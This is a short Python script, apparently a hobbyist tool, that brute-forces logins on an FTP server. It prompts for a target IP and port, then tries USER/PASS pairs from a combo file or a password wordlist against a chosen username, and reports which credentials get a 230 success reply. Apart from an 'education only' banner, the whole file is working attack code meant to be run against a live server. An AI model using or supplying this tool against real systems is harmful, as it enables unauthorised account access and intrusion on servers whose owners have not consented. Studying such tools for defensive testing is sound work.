import socket

class BruteForce:

    def __init__(self, host, port):
        self.host, self.port = host, port

    def Auth(self, user, password):
        self.user = user
        self.password = password
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.socket.connect((self.host, self.port))

        self.response = self.socket.recv(250)

        self.socket.send(b"USER " + self.user.encode() + b"\r\n")

        self.response = self.socket.recv(1000)

        self.socket.send(b"PASS " + self.password.encode() + b"\r\n")

        self.response = self.socket.recv(1000)

        if "230" in self.response.decode():
            print ("Conection succes with user " + str(self.user), "and password " + str(self.password))
        else:
            print("Fail with combo: " + str(self.user) + ":" + str(self.password))

def GetCombo(File):
    s = open(File, "r")
    combo = s.read()
    combo = str(combo).replace(":", " ")
    combo = combo.split()
    s.close()

    return combo

def BruteCombo(serverC, file):
    combo = GetCombo(file)
    k = 0

    for i in range(0, len(combo)):
        if k + 1 >= len(combo):
            try:
                user = combo[k - 1]
                password = combo[k]
            except:
                break
        else:
            user = combo[k]
            password = combo[k + 1]

        serverC.Auth(user, password)
        k += 2

def GetWordList(File):
    s = open(File, "r")
    wordlist = s.read()
    s.close()
    wordlist = wordlist.split()

    return wordlist

def BruteWordlist(user, serverW, file):
    wordlist = GetWordList(file)

    for i in range(0, len(wordlist)):
        password = wordlist[i]

        serverW.Auth(user, password)


print("--------------------------------")
print("Welcome to easy FTP Brut Force\nIt's for education only and made by ach for learn")
print("--------------------------------\n")
ip = input("IP of the FTP server: ")
port = input("Port of the FTP server: ")
server = BruteForce(ip, int(port))
print("\n--------------------------------")
print("What type of Brute Force do you want to use on " + ip + ":" + port)
print("- 1: Brute Force with combo")
print("- 2: Brute Force with world list")
print("--------------------------------\n")
method = input("What method do you want: ")
if method == "1":
    file = input("Text file where located combo (need username:password): ")
    BruteCombo(server, file)
elif method == "2":
    user = input("Username to Brut Force: ")
    file = input("Text file where located world list: ")
    BruteWordlist(user, server, file)